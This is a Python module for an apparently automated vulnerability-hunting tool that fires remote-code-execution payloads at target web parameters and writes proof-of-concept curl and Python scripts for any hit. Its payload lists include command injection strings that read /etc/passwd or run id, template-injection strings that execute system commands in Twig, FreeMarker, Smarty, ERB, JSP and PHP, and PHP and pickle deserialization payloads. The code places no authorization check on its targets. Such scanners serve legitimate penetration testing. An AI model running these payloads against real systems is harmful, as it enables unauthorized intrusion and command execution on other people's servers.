"""
Specialized RCE Hunter
Advanced RCE detection: command injection, deserialization, SSTI, file upload
"""

import asyncio
import re
from typing import List, Dict, Any, Optional
from dataclasses import dataclass

from core.config_manager import get_config
from hunting.scanner_orchestrator import VulnerabilityFinding, ScanTarget, ScannerType


class RCEHunter:
    """Specialized RCE hunting module"""

    def __init__(self, config_manager):
        self.config = config_manager
        self.findings: List[VulnerabilityFinding] = []

        # Command injection payloads
        self.cmd_payloads = {
            "basic": [
                "; id",
                "| id",
                "& id",
                "&& id",
                "|| id",
                "`id`",
                "$(id)",
                "; whoami",
                "| whoami",
                "`whoami`",
                "$(whoami)",
            ],
            "sleep": [
                "; sleep 5",
                "| sleep 5",
                "`sleep 5`",
                "$(sleep 5)",
                "; ping -c 5 127.0.0.1",
                "| ping -c 5 127.0.0.1",
            ],
            "output": [
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "`cat /etc/passwd`",
                "$(cat /etc/passwd)",
                "; cat /etc/hosts",
                "| cat /etc/hosts",
            ],
            "windows": [
                "& whoami",
                "&& whoami",
                "| whoami",
                "`whoami`",
                "$(whoami)",
                "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
                "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
            ],
            "filter_bypass": [
                ";${IFS}id",
                "|${IFS}id",
                ";$IFS$id",
                "{id,}",
                "$(id)",
                "`id`",
                ";id;",
                "|id|",
                "||id||",
            ],
        }

        # SSTI payloads by template engine
        self.ssti_payloads = {
            "jinja2": [
                "{{7*7}}",
                "{{config}}",
                "{{request}}",
                "{{self.__class__.__mro__[1].__subclasses__()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
            ],
            "twig": [
                "{{7*7}}",
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                "{{['id']|filter('system')}}",
            ],
            "freemarker": [
                "${7*7}",
                "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
            ],
            "velocity": [
                "#set($x=7*7)${x}",
                "#set($rt=$class.inspect())",
            ],
            "smarty": [
                "{php}echo 7*7;{/php}",
                "{system('id')}",
            ],
            "erb": [
                "<%= 7*7 %>",
                "<%= `id` %>",
            ],
            "jsp": [
                "<%= 7*7 %>",
                "<% Runtime.getRuntime().exec(\"id\") %>",
            ],
            "php": [
                "<?php echo 7*7; ?>",
                "<?php system('id'); ?>",
                "<?=`id`?>",
            ],
        }

        # Deserialization payloads
        self.deserial_payloads = {
            "java": [
                "aced0005737200116a6176612e7574696c2e486173684d6170",  # HashMap
                "aced00057372000d6a6176612e7574696c2e41727261794c697374",  # ArrayList
            ],
            "php": [
                'O:8:"stdClass":0:{}',
                'O:14:"Illuminate\\Support\\MessageBag":2:{s:11:"\x00*\x00messages";a:0:{}s:9:"\x00*\x00format";s:6:"system";}',
            ],
            "python": [
                "cos\nsystem\n(S'id'\ntR.",
                "cposix\nsystem\n(S'id'\ntR.",
            ],
            "dotnet": [
                "AAEAAAD/////AQAAAAAAAAAMAgAAAFRTeXN0ZW0sIFZlcnNpb249NC4wLjAuMA==",
            ],
        }

    async def hunt(self, targets: List[ScanTarget]) -> List[VulnerabilityFinding]:
        """Hunt for RCE vulnerabilities"""
        param_targets = [t for t in targets if t.parameters]

        for target in param_targets[:50]:
            for param_name, param_value in target.parameters.items():
                await self._test_command_injection(target, param_name)
                await self._test_ssti(target, param_name)
                await self._test_deserialization(target, param_name)

        return self.findings

    async def _test_command_injection(self, target: ScanTarget, param_name: str):
        """Test command injection"""
        # Test basic payloads
        for payload in self.cmd_payloads["basic"]:
            result = await self._send_and_check_rce(target, param_name, payload, "command_injection")
            if result:
                result.severity = "P1"
                result.title = f"Command Injection in {param_name} parameter"
                result.description = f"Command injection in {param_name} parameter. Payload: {payload}"
                result.tags = ["rce", "command-injection"]
                self.findings.append(result)
                return

        # Test time-based
        for payload in self.cmd_payloads["sleep"]:
            result = await self._send_and_check_timing(target, param_name, payload, "command_injection")
            if result:
                result.severity = "P1"
                result.title = f"Time-based Command Injection in {param_name} parameter"
                result.description = f"Time-based command injection in {param_name} parameter. Payload: {payload}"
                result.tags = ["rce", "command-injection", "time-based"]
                self.findings.append(result)
                return

        # Test filter bypasses
        for payload in self.cmd_payloads["filter_bypass"]:
            result = await self._send_and_check_rce(target, param_name, payload, "command_injection")
            if result:
                result.severity = "P1"
                result.title = f"Command Injection (Filter Bypass) in {param_name} parameter"
                result.description = f"Command injection with filter bypass in {param_name} parameter. Payload: {payload}"
                result.tags = ["rce", "command-injection", "filter-bypass"]
                self.findings.append(result)
                return

    async def _test_ssti(self, target: ScanTarget, param_name: str):
        """Test Server-Side Template Injection"""
        # First detect template engine
        engine = await self._detect_template_engine(target, param_name)
        if not engine:
            # Try all engines
            for engine_name, payloads in self.ssti_payloads.items():
                for payload in payloads[:3]:
                    result = await self._send_and_check_ssti(target, param_name, payload, engine_name)
                    if result:
                        result.severity = "P1"
                        result.title = f"SSTI in {param_name} parameter ({engine_name})"
                        result.description = f"Server-side template injection in {param_name} parameter. Template engine: {engine_name}. Payload: {payload}"
                        result.tags = ["rce", "ssti", engine_name]
                        self.findings.append(result)
                        return
        else:
            # Test specific engine
            payloads = self.ssti_payloads.get(engine, [])
            for payload in payloads[:5]:
                result = await self._send_and_check_ssti(target, param_name, payload, engine)
                if result:
                    result.severity = "P1"
                    result.title = f"SSTI in {param_name} parameter ({engine})"
                    result.description = f"Server-side template injection in {param_name} parameter. Template engine: {engine}. Payload: {payload}"
                    result.tags = ["rce", "ssti", engine]
                    self.findings.append(result)
                    return

    async def _detect_template_engine(self, target: ScanTarget, param_name: str) -> Optional[str]:
        """Detect template engine by testing mathematical expressions"""
        test_payloads = {
            "jinja2": "{{7*7}}",
            "twig": "{{7*7}}",
            "freemarker": "${7*7}",
            "velocity": "#set($x=7*7)${x}",
            "smarty": "{7*7}",
            "erb": "<%= 7*7 %>",
            "jsp": "<%= 7*7 %>",
            "php": "<?php echo 7*7; ?>",
        }

        for engine, payload in test_payloads.items():
            result = await self._send_payload(target, param_name, payload)
            if result and "49" in result.text:
                return engine
        return None

    async def _test_deserialization(self, target: ScanTarget, param_name: str):
        """Test insecure deserialization"""
        # Check if parameter looks like serialized data
        param_value = target.parameters.get(param_name, "")

        # Try different deserialization payloads
        for lang, payloads in self.deserial_payloads.items():
            for payload in payloads:
                result = await self._send_payload(target, param_name, payload)
                if result and result.status_code != 400:
                    # Check for deserialization errors
                    if self._has_deserialization_error(result.text, lang):
                        finding = VulnerabilityFinding(
                            scanner=ScannerType.CUSTOM,
                            vuln_type="rce",
                            severity="P1",
                            title=f"Insecure Deserialization in {param_name} parameter ({lang})",
                            description=f"Insecure deserialization in {param_name} parameter. Language: {lang}. Payload: {payload[:50]}...",
                            target=target,
                            evidence={
                                "technique": "deserialization",
                                "language": lang,
                                "payload": payload[:100],
                                "response_snippet": result.text[:500],
                            },
                            poc="",
                            confidence=0.7,
                            tags=["rce", "deserialization", lang],
                        )
                        self.findings.append(finding)
                        return

    async def _send_and_check_rce(self, target: ScanTarget, param_name: str, payload: str, technique: str) -> Optional[VulnerabilityFinding]:
        """Send payload and check for RCE indicators"""
        result = await self._send_payload(target, param_name, payload)
        if not result:
            return None

        # Check for command output in response
        rce_indicators = [
            "uid=", "gid=", "groups=",  # id command
            "root:", "daemon:", "bin:", "sys:",  # /etc/passwd
            "127.0.0.1", "localhost",  # ping
            "PING", "64 bytes from",  # ping output
            "Windows IP Configuration", "Ethernet adapter",  # ipconfig
        ]

        for indicator in rce_indicators:
            if indicator in result.text:
                return VulnerabilityFinding(
                    scanner=ScannerType.CUSTOM,
                    vuln_type="rce",
                    severity="P1",
                    title="",
                    description="",
                    target=target,
                    evidence={
                        "technique": technique,
                        "payload": payload,
                        "indicator": indicator,
                        "response_snippet": result.text[:500],
                    },
                    poc=self._generate_rce_poc(target.url, param_name, payload, technique),
                    confidence=0.9,
                    tags=["rce", technique],
                )
        return None

    async def _send_and_check_timing(self, target: ScanTarget, param_name: str, payload: str, technique: str) -> Optional[VulnerabilityFinding]:
        """Send payload and check for time delay"""
        import time
        import httpx

        url = self._inject_parameter(target.url, param_name, payload) if target.method == "GET" else target.url

        try:
            start = time.time()
            async with httpx.AsyncClient(timeout=30.0) as client:
                if target.method == "GET":
                    await client.get(url)
                else:
                    data = dict(target.parameters)
                    data[param_name] = payload
                    await client.post(target.url, data=data)
            elapsed = time.time() - start

            if elapsed > 4:  # 5 second sleep minus overhead
                return VulnerabilityFinding(
                    scanner=ScannerType.CUSTOM,
                    vuln_type="rce",
                    severity="P1",
                    title="",
                    description="",
                    target=target,
                    evidence={
                        "technique": f"{technique}_time_based",
                        "payload": payload,
                        "delay": elapsed,
                    },
                    poc=self._generate_rce_poc(target.url, param_name, payload, technique),
                    confidence=0.85,
                    tags=["rce", technique, "time-based"],
                )
        except Exception:
            pass
        return None

    async def _send_and_check_ssti(self, target: ScanTarget, param_name: str, payload: str, engine: str) -> Optional[VulnerabilityFinding]:
        """Send payload and check for SSTI"""
        result = await self._send_payload(target, param_name, payload)
        if not result:
            return None

        # Check for SSTI indicators
        if "49" in result.text:  # 7*7=49
            return VulnerabilityFinding(
                scanner=ScannerType.CUSTOM,
                vuln_type="rce",
                severity="P1",
                title="",
                description="",
                target=target,
                evidence={
                    "technique": "ssti",
                    "engine": engine,
                    "payload": payload,
                    "response_snippet": result.text[:500],
                },
                poc=self._generate_ssti_poc(target.url, param_name, payload, engine),
                confidence=0.9,
                tags=["rce", "ssti", engine],
            )
        return None

    def _has_deserialization_error(self, text: str, lang: str) -> bool:
        """Check for deserialization error messages"""
        errors = {
            "java": ["java.io.", "java.lang.", "org.apache.commons.collections", "ysoserial", "SerializationException", "ClassNotFoundException"],
            "php": ["__PHP_Incomplete_Class", "unserialize()", "Serialization", "__wakeup", "__destruct"],
            "python": ["pickle.", "UnpicklingError", "__reduce__", "__reduce_ex__"],
            "dotnet": ["System.Runtime.Serialization", "Deserialize", "BinaryFormatter", "ObjectStateFormatter"],
        }

        lang_errors = errors.get(lang, [])
        for err in lang_errors:
            if err.lower() in text.lower():
                return True
        return False

    async def _send_payload(self, target: ScanTarget, param_name: str, payload: str):
        """Send HTTP request with payload"""
        import httpx

        if target.method == "GET":
            url = self._inject_parameter(target.url, param_name, payload)
            try:
                async with httpx.AsyncClient(timeout=15.0, follow_redirects=True) as client:
                    return await client.get(url)
            except Exception:
                return None
        else:
            data = dict(target.parameters)
            data[param_name] = payload
            try:
                async with httpx.AsyncClient(timeout=15.0, follow_redirects=True) as client:
                    return await client.post(target.url, data=data)
            except Exception:
                return None

    def _inject_parameter(self, url: str, param_name: str, value: str) -> str:
        """Inject parameter into URL"""
        import urllib.parse
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        params[param_name] = [value]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def _generate_rce_poc(self, url: str, param: str, payload: str, technique: str) -> str:
        """Generate RCE POC"""
        import urllib.parse
        parsed = urllib.parse.urlparse(url)
        base_url = urllib.parse.urlunparse(parsed._replace(query=''))

        return f"""# RCE Proof of Concept
## Vulnerability Details
- **URL**: {url}
- **Parameter**: {param}
- **Technique**: {technique}
- **Payload**: {payload}

## Reproduction Steps
1. Navigate to: {base_url}?{param}={urllib.parse.quote(payload)}
2. Observe command execution

## cURL Command
```bash
curl -X GET "{base_url}?{param}={urllib.parse.quote(payload)}"
```

## Python Script
```python
import requests

url = "{base_url}"
params = {{"{param}": "{payload}"}}
response = requests.get(url, params=params, timeout=15)
print(f"Status: {{response.status_code}}")
print(f"Output: {{response.text[:500]}}")
```"""

    def _generate_ssti_poc(self, url: str, param: str, payload: str, engine: str) -> str:
        """Generate SSTI POC"""
        import urllib.parse
        parsed = urllib.parse.urlparse(url)
        base_url = urllib.parse.urlunparse(parsed._replace(query=''))

        return f"""# SSTI Proof of Concept
## Vulnerability Details
- **URL**: {url}
- **Parameter**: {param}
- **Template Engine**: {engine}
- **Payload**: {payload}

## Reproduction Steps
1. Navigate to: {base_url}?{param}={urllib.parse.quote(payload)}
2. Observe "49" in response (7*7)

## cURL Command
```bash
curl -X GET "{base_url}?{param}={urllib.parse.quote(payload)}"
```"""


class FileUploadRCEHunter:
    """File upload RCE hunter"""

    def __init__(self, config_manager):
        self.config = config_manager

    async def hunt(self, targets: List[ScanTarget]) -> List[VulnerabilityFinding]:
        """Hunt for file upload RCE"""
        # This would need browser automation to find upload forms
        # For now, return empty
        return []


async def hunt_rce(targets: List[ScanTarget], config_manager=None) -> List[VulnerabilityFinding]:
    """Hunt for RCE vulnerabilities"""
    hunter = RCEHunter(config_manager or get_config())
    return await hunter.hunt(targets)